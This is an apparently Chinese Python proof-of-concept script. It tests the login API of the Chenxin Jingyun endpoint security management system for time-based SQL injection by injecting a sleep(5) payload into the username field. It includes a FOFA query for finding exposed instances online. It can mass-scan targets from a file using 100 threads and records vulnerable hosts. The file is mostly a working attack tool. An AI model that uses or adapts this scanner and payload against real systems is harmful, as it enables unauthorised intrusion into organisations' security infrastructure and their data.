#辰信景云终端安全管理系统 login SQL 注入漏洞 
#fofa:"辰信景云终端安全管理系统" && icon_hash="-429260979"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
██╗      ██████╗  ██████╗ ██╗███╗   ██╗        ███████╗ ██████╗ ██╗     
██║     ██╔═══██╗██╔════╝ ██║████╗  ██║        ██╔════╝██╔═══██╗██║     
██║     ██║   ██║██║  ███╗██║██╔██╗ ██║        ███████╗██║   ██║██║     
██║     ██║   ██║██║   ██║██║██║╚██╗██║        ╚════██║██║▄▄ ██║██║     
███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║███████╗███████║╚██████╔╝███████╗
╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝
                                                                    
                                                                                                                                                                                      
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="辰信景云终端安全管理系统login_SQL注入漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/api/user/login"
    headers = {
        'Content-Length':'102',
        'Sec-Ch-Ua':'"Chromium";v="109","Not_ABrand";v="99"',
        'Accept':'application/json,text/javascript,*/*;q=0.01',
        'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
        'Accept-Encoding':'gzip,deflate',
        'Accept-Language':'zh-CN,zh;q=0.9', 
    }
    data1 = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='"
    data2 = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin"
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data1,verify=False,proxies=proxies)
        res2 = requests.post(url=target+payload,headers=headers,data=data2,verify=False,proxies=proxies)
        time1 = res1.elapsed.total_seconds()
        time2 = res2.elapsed.total_seconds()
        if time1-time2>=4:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()